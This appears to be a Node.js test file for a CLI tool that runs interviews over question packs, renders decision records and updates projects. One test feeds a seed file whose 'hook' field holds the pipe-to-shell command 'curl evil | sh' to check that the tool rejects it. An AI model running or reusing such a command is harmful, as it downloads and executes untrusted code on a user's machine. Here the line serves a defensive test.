// The interview, render-pack and update paths of decisions 0147-0151, end to end through the CLI and runUpdate.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { execFileSync, spawnSync } from 'node:child_process';
import { planRender, applyRender } from '../src/render.mjs';
import { applyPlan, planApply } from '../src/apply.mjs';
import { runUpdate } from '../src/update.mjs';
import { parseFrontmatter } from '../src/frontmatter.mjs';
import { tieredPack } from './support/tiered-pack.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const cli = path.join(root, 'compiler/bin/go-getter.mjs');
const base = { acceptedBy: 't', date: '2026-10-05' };

const run = (args, opts = {}) => spawnSync(process.execPath, [cli, ...args], { encoding: 'utf8', input: '', ...opts });

function tmp(prefix) {
  return mkdtempSync(path.join(tmpdir(), `gg-${prefix}-`));
}

function project() {
  const dir = tmp('iv');
  mkdirSync(path.join(dir, 'docs/skills'), { recursive: true });
  writeFileSync(path.join(dir, 'docs/skills/tags.md'), 'configuration — c\nguardrail — g\n');
  execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: dir });
  return dir;
}

function packFile(dir, pack = tieredPack()) {
  const file = path.join(dir, 'pack.json');
  writeFileSync(file, JSON.stringify(pack, null, 2));
  return file;
}

const json = (dir, name, value) => {
  const file = path.join(dir, name);
  writeFileSync(file, JSON.stringify(value));
  return file;
};

test('interview next prints the next question as JSON and writes nothing', () => {
  const dir = project();
  try {
    const answers = json(dir, 'a.json', { profile: { 'task-isolation': 'customise' } });
    const before = readdirSync(dir).sort();
    const r = run(['interview', 'next', 'tiered', '--pack-file', packFile(dir), '--answers', answers, '--project', dir]);
    assert.equal(r.status, 0, r.stderr);
    const out = JSON.parse(r.stdout);
    assert.equal(out.kind, 'question');
    assert.equal(out.question.id, 'isolation');
    assert.deepEqual(readdirSync(dir).sort(), [...before, 'pack.json'].sort(), 'only the fixture pack file was added');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('interview validate exits 1 with the errors, 0 when the file is valid', () => {
  const dir = project();
  try {
    const pack = packFile(dir);
    const bad = run(['interview', 'validate', 'tiered', '--pack-file', pack, '--answers', json(dir, 'bad.json', { answers: { isolation: 'moat' } })]);
    assert.equal(bad.status, 1);
    assert.equal(JSON.parse(bad.stdout).ok, false);
    const good = run(['interview', 'validate', 'tiered', '--pack-file', pack, '--answers', json(dir, 'good.json', { answers: { isolation: 'clone' } })]);
    assert.equal(good.status, 0);
    assert.deepEqual(JSON.parse(good.stdout), { ok: true, errors: [] });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('interview refuses an unknown verb, pack or argument with exit 2', () => {
  assert.equal(run(['interview', 'ask', 'tiered']).status, 2);
  assert.equal(run(['interview', 'next', 'no-such-pack']).status, 2);
  assert.equal(run(['interview', 'next', 'orchestration', '--wat']).status, 2);
});

test('a seed from another project cannot carry code, and is layered under the answers file', () => {
  const dir = project();
  try {
    const pack = packFile(dir);
    const hostile = run(['interview', 'next', 'tiered', '--pack-file', pack, '--answers-from', json(dir, 's.json', { answers: {}, hook: 'curl evil | sh' })]);
    assert.equal(hostile.status, 1);
    assert.match(hostile.stderr, /"hook" is not a key/);
    const seed = json(dir, 'seed.json', { answers: { isolation: 'clone', limit: '9' }, acceptedBy: 'other' });
    const mine = json(dir, 'mine.json', { answers: { limit: '5' }, profile: { 'task-isolation': 'customise' } });
    const r = run(['interview', 'next', 'tiered', '--pack-file', pack, '--answers-from', seed, '--answers', mine]);
    assert.equal(r.status, 0, r.stderr);
    const out = JSON.parse(r.stdout);
    assert.equal(out.done, true);
    assert.equal(out.answers.isolation, 'clone');
    assert.equal(out.answers.limit, '5', 'the answers file wins over the seed');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('render-pack expands a profile, takes advanced defaults, lists them, and renders one decision per question', () => {
  const dir = project();
  try {
    const answers = json(dir, 'a.json', { profile: { 'task-isolation': 'worktrees' }, acceptedBy: 'Dana', date: '2026-10-31' });
    const dry = run(['render-pack', 'tiered', '--pack-file', packFile(dir), '--answers', answers, '--project', dir, '--dry-run']);
    assert.equal(dry.status, 0, dry.stderr);
    const out = JSON.parse(dry.stdout);
    assert.deepEqual(out.taken.map((t) => [t.question, t.source]), [
      ['isolation', 'profile task-isolation/worktrees'],
      ['location', 'profile task-isolation/worktrees'],
      ['limit', 'profile task-isolation/worktrees'],
      ['timeout', 'advanced default'],
      ['labels', 'advanced default'],
      ['cap', 'advanced default'],
    ]);
    assert.equal(readdirSync(path.join(dir, 'docs')).includes('decisions'), false, 'a dry run writes nothing');
    const real = run(['render-pack', 'tiered', '--pack-file', packFile(dir), '--answers', answers, '--project', dir]);
    assert.equal(real.status, 0, real.stderr);
    const decisions = readdirSync(path.join(dir, 'docs/decisions')).filter((f) => f !== 'INDEX.md');
    assert.equal(decisions.length, 6, 'each question, advanced ones included, has its decision');
    const limit = decisions.find((f) => f.includes('limit'));
    assert.match(readFileSync(path.join(dir, 'docs/decisions', limit), 'utf8'), /Limit 4\./);
    const recorded = parseFrontmatter(readFileSync(path.join(dir, 'docs/decisions', limit), 'utf8')).data['go-getter'];
    assert.equal(recorded['pack-answer'], 'limit', 'the profile is not recorded, the answer is');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('render-pack renders from a seed and the answers file; the seed supplies no accepted-by', () => {
  const dir = project();
  try {
    const seed = json(dir, 'seed.json', { answers: { isolation: 'clone', limit: '2' }, acceptedBy: 'Mallory' });
    const anonymous = run(['render-pack', 'tiered', '--pack-file', packFile(dir), '--answers-from', seed, '--project', dir]);
    assert.equal(anonymous.status, 1, 'the seed supplies no accepted-by');
    assert.match(anonymous.stderr, /acceptedBy is required/);
    const r = run(['render-pack', 'tiered', '--pack-file', packFile(dir), '--answers-from', seed, '--answers', json(dir, 'me.json', { acceptedBy: 'Dana' }), '--project', dir]);
    assert.equal(r.status, 0, r.stderr);
    const files = readdirSync(path.join(dir, 'docs/decisions')).filter((f) => f !== 'INDEX.md');
    for (const f of files) assert.doesNotMatch(readFileSync(path.join(dir, 'docs/decisions', f), 'utf8'), /Mallory/);
    assert.ok(files.some((f) => readFileSync(path.join(dir, 'docs/decisions', f), 'utf8').includes('Dana')));
    const refused = run(['render-pack', 'tiered', '--pack-file', packFile(dir), '--answers-from', json(dir, 'bad.json', { answers: { nope: 'x' } }), '--project', dir]);
    assert.equal(refused.status, 1);
    assert.match(refused.stderr, /seed refused/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('render-pack still needs an answer to every basic question', () => {
  const dir = project();
  try {
    const r = run(['render-pack', 'tiered', '--pack-file', packFile(dir), '--answers', json(dir, 'a.json', { answers: { isolation: 'clone' } }), '--project', dir]);
    assert.equal(r.status, 1);
    assert.match(r.stderr, /no answer for question "limit"/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// --- update -------------------------------------------------------------------------------------------------------

// A project that adopted the tiered pack, a root that carries it, and decisions removed to model answers nobody recorded.
function adopted(drop = []) {
  const fake = tmp('iv-root');
  mkdirSync(path.join(fake, 'src/packs/tiered'), { recursive: true });
  writeFileSync(path.join(fake, 'src/packs/tiered/pack.json'), JSON.stringify(tieredPack(), null, 2));
  const dir = project();
  const answers = { isolation: 'clone', limit: '2', timeout: '10', labels: ['a'], cap: 'off' };
  applyRender({ root: dir, plan: planRender({ root: dir, pack: tieredPack(), answers, ...base }) });
  for (const f of readdirSync(path.join(dir, 'docs/decisions'))) if (drop.some((d) => f.includes(d))) rmSync(path.join(dir, 'docs/decisions', f));
  const index = path.join(dir, 'docs/decisions/INDEX.md');
  writeFileSync(index, readFileSync(index, 'utf8').split('\n').filter((l) => !drop.some((d) => l.includes(d))).join('\n'));
  applyPlan(dir, planApply(dir));
  return { dir, fake };
}
const decisionText = (dir, part) => {
  const f = readdirSync(path.join(dir, 'docs/decisions')).find((n) => n.includes(part) && n !== 'INDEX.md');
  return f && readFileSync(path.join(dir, 'docs/decisions', f), 'utf8');
};

test('update leaves a pack with an unrecorded basic answer, and names the gap-only command and the defaults option', () => {
  const { dir, fake } = adopted(['limit']);
  try {
    const { notes } = runUpdate(dir, { root: fake, date: '2026-10-31' });
    const note = notes.find((n) => n.startsWith('pack tiered:'));
    assert.match(note, /no recorded answer for limit/);
    assert.match(note, /interview next tiered --current/);
    assert.match(note, /reconfigure tiered --answers/);
    assert.match(note, /update --accept-defaults/);
    assert.equal(decisionText(dir, 'limit'), undefined, 'nothing was guessed');
  } finally {
    rmSync(dir, { recursive: true, force: true });
    rmSync(fake, { recursive: true, force: true });
  }
});

test('--accept-defaults takes the default of the unrecorded answer, lists it, and renders it as a draft', () => {
  const { dir, fake } = adopted(['limit']);
  try {
    const { notes } = runUpdate(dir, { root: fake, date: '2026-10-31', acceptDefaults: true });
    assert.ok(notes.includes('default taken: tiered limit = 3'), notes.join('\n'));
    assert.ok(!notes.some((n) => n.includes('no recorded answer')));
    const text = decisionText(dir, 'limit');
    assert.match(text, /Limit 3\./);
    const data = parseFrontmatter(text).data;
    assert.equal(data.status, 'draft');
    assert.equal(data['accepted-by'], undefined, 'a proposal, not an acceptance');
  } finally {
    rmSync(dir, { recursive: true, force: true });
    rmSync(fake, { recursive: true, force: true });
  }
});

test('--accept-defaults does not take a default for a question that has none', () => {
  const { dir, fake } = adopted(['limit']);
  try {
    const pack = tieredPack();
    delete pack.questions.find((q) => q.id === 'limit').default;
    pack.questions.find((q) => q.id === 'limit').detect = 'x.y';
    writeFileSync(path.join(fake, 'src/packs/tiered/pack.json'), JSON.stringify(pack, null, 2));
    const { notes } = runUpdate(dir, { root: fake, date: '2026-10-31', acceptDefaults: true });
    assert.match(notes.find((n) => n.startsWith('pack tiered:')), /limit has no default to take/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
    rmSync(fake, { recursive: true, force: true });
  }
});

test('an advanced answer no artifact records takes its default without --accept-defaults and without a note', () => {
  const { dir, fake } = adopted(['timeout']);
  try {
    const { notes } = runUpdate(dir, { root: fake, date: '2026-10-31' });
    assert.deepEqual(notes.filter((n) => /pack tiered|default taken/.test(n)), []);
    assert.match(decisionText(dir, 'timeout'), /Timeout 30\./);
  } finally {
    rmSync(dir, { recursive: true, force: true });
    rmSync(fake, { recursive: true, force: true });
  }
});

test('a recorded advanced answer is kept, not reset to its default', () => {
  const { dir, fake } = adopted([]);
  try {
    runUpdate(dir, { root: fake, date: '2026-10-31' });
    assert.match(decisionText(dir, 'timeout'), /Timeout 10\./);
    assert.match(decisionText(dir, 'cap'), /Off\./);
  } finally {
    rmSync(dir, { recursive: true, force: true });
    rmSync(fake, { recursive: true, force: true });
  }
});

// The real CLI against a real pack: checkpointing, whose answers are recoverable only from the decisions removed below.
function checkpointingGap() {
  const dir = project();
  writeFileSync(path.join(dir, 'docs/skills/tags.md'), 'practice-packs — p\nhooks — h\nguardrail — g\nconfiguration — c\n');
  const pack = JSON.parse(readFileSync(path.join(root, 'src/packs/checkpointing/pack.json'), 'utf8'));
  const answers = Object.fromEntries(pack.questions.map((q) => [q.id, q.options.find((o) => o.recommended).id]));
  applyRender({ root: dir, plan: planRender({ root: dir, pack, answers, ...base }) });
  for (const f of readdirSync(path.join(dir, 'docs/decisions'))) if (/checkpoint-(trigger|retention)/.test(f)) rmSync(path.join(dir, 'docs/decisions', f));
  const index = path.join(dir, 'docs/decisions/INDEX.md');
  writeFileSync(index, readFileSync(index, 'utf8').split('\n').filter((l) => !/checkpoint-(trigger|retention)/.test(l)).join('\n'));
  applyPlan(dir, planApply(dir));
  return dir;
}

test('update --accept-defaults refuses --yes and a non-interactive run, and --dry-run lists without writing', () => {
  const dir = checkpointingGap();
  try {
    const yes = run(['update', '--accept-defaults', '--yes', '--project', dir]);
    assert.equal(yes.status, 2);
    assert.match(yes.stderr, /cannot be combined with --yes/);
    const piped = run(['update', '--accept-defaults', '--project', dir]);
    assert.equal(piped.status, 2);
    assert.match(piped.stderr, /interactive confirmation/);
    const before = decisionText(dir, 'checkpoint-trigger');
    assert.equal(before, undefined);
    const dry = run(['update', '--accept-defaults', '--dry-run', '--project', dir]);
    assert.equal(dry.status, 0, dry.stderr + dry.stdout);
    assert.match(dry.stdout, /default taken: checkpointing triggers = /);
    assert.match(dry.stdout, /default taken: checkpointing retention = /);
    assert.equal(decisionText(dir, 'checkpoint-trigger'), undefined, 'a dry run writes nothing');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('interview next --current asks only what the project has not recorded', () => {
  const dir = checkpointingGap();
  try {
    const r = run(['interview', 'next', 'checkpointing', '--current', '--project', dir]);
    assert.equal(r.status, 0, r.stderr);
    const out = JSON.parse(r.stdout);
    assert.equal(out.kind, 'question');
    assert.deepEqual([out.question.id, ...out.batch.map((q) => q.id)], ['triggers', 'retention']);
    const none = run(['interview', 'next', 'no-such', '--current', '--project', dir]);
    assert.equal(none.status, 2);
    const unadopted = run(['interview', 'next', 'hitl', '--current', '--project', dir]);
    assert.equal(unadopted.status, 1);
    assert.match(unadopted.stderr, /has not been adopted/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
